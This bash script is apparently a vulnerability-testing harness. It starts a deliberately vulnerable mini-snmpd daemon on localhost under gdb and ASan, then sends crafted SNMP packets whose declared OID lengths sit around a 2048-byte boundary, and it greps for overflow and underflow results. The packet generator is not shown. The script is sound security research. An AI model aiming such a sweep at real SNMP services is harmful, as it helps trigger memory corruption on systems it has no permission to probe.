#!/bin/bash
# Declared-length sweep on a plant-started vulnerable daemon. Each run binds
# 127.0.0.1:16172 only; gdb kills the inferior at decode_oid's return.
set -u
HERE="$(cd "$(dirname "$0")" && pwd)"
WIRE="$(dirname "$HERE")"
B=mini-snmpd-b532243732609cf7af58ceb1794a0adfe8deeff1
PORT=16172
cd "$WIRE" || exit 99

for DECL in 2047 2048 2049 2050 65535; do
    PK="$HERE/sweep-${DECL}.bin"
    OUT="$HERE/sweep-${DECL}.out"
    python3 "$HERE/mksweep.py" "$DECL" "$PK" || exit 98
    ( cd "$WIRE/$B" || exit 98
      exec timeout 30 env ASAN_OPTIONS=abort_on_error=0:detect_leaks=0 \
           gdb -q -batch -x "$HERE/cmd_sweep.gdb" \
           --args ./mini-snmpd -n -p "$PORT" -l debug
    ) > "$OUT" 2>&1 &
    pid=$!
    sleep 2
    python3 - "$PORT" "$PK" <<'PY'
import socket, sys
data = open(sys.argv[2], "rb").read()
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(data, ("127.0.0.1", int(sys.argv[1])))
PY
    wait "$pid"
    printf 'declared=%-6s ' "$DECL"
    grep -E '^(RESULT|Breakpoint [1-4],)' "$OUT" | tr '\n' ' ' || true
    grep -E 'overflow for OID|underflow for OID' "$OUT" | tr '\n' ' ' || true
    printf '\n'
done
